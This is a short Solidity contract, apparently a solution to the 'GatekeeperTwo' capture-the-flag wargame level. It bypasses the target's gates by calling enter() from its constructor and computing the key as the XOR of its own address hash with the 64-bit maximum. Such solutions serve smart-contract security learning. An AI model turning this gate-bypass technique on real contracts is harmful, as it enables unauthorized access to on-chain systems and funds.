// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IGatekeeperTwo} from "../interfaces/IGatekeeperTwo.sol";

contract GatekeeperTwoAttack {
    bytes8 public gateKeyUsed;

    constructor(address _targetAddress) {
        uint64 a = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 b = a ^ type(uint64).max;
        bytes8 gateKey = bytes8(b);

        gateKeyUsed = gateKey;
        IGatekeeperTwo(_targetAddress).enter(gateKey);
    }
}
